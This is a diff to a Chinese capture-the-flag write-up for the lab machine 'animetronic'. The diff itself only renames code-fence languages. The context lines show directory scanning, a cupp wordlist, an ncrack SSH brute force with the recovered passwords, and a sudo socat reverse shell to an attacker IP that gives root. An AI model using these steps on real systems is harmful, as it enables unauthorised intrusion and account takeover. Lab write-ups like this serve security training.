@@ -29,7 +29,7 @@ The server administrator assigned you to hack this server .So don't disappoint h
 
 目录扫描：
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $feroxbuster -u http://192.168.56.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -112,7 +112,7 @@ Hobbies: swimming
 
 根据得到的信息，进行字典生成
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $cupp -i
  ___________
@@ -162,7 +162,7 @@ Hobbies: swimming
 
 然后尝试爆破 Michael 的 SSH 凭据
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~]
 └──╼ $ncrack -T5 -v -u michael -P michael.txt ssh://192.168.56.119
 
@@ -173,7 +173,7 @@ Discovered credentials on ssh://192.168.56.119:22 'michael' 'leahcim1996'
 
 ## user pwned
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs michael@192.168.56.119
 [20:03:59] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
@@ -231,7 +231,7 @@ aGVucnlwYXNzd29yZC50eHQK
 
 解码后的到：`henrypassword.txt`
 
-```shell
+```bash
 (remote) michael@animetronic:/home/henry$ find / -type f -name henrypassword.txt 2>/dev/null
 /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
 ```
@@ -244,7 +244,7 @@ IHateWilliam
 
 成功切换到 henry 账户
 
-```shell
+```bash
 (local) pwncat$ connect henry@192.168.56.119
 Password: ************
 [20:10:19] 192.168.56.119:22: loaded known host from db                                                                                                                                                                      manager.py:957
@@ -285,13 +285,13 @@ User henry may run the following commands on animetronic:
 
 尝试借助 sudo+socat 反弹 shell
 
-```shell
+```bash
 sudo /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.102:9999
 ```
 
 成功收到回连的shell
 
-```shell
+```bash
 (local) pwncat$ connect -lp 9999
 [20:14:04] received connection from 192.168.56.119:51080                                                                                                                                                                         bind.py:84
 [20:14:05] 192.168.56.119:51080: registered new host w/ db                                                                                                                                                                   manager.py:957
@@ -302,7 +302,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 (remote) root@animetronic:/root# cat root.txt 
 153a1b940365f46ebed28d74f142530f280a2c0a
 ```
